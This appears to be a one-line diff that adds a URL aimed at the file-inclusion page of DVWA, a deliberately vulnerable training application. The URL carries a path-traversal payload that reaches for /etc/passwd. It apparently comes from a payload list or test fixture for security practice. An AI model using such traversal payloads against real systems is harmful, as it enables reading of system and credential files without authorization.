@@ -1,0 +1,1 @@
+http://dvwa.ccc.com/vulnerabilities/fi/?page=../../../../../etc/passwd&bookcase=book05-browser-path-raw
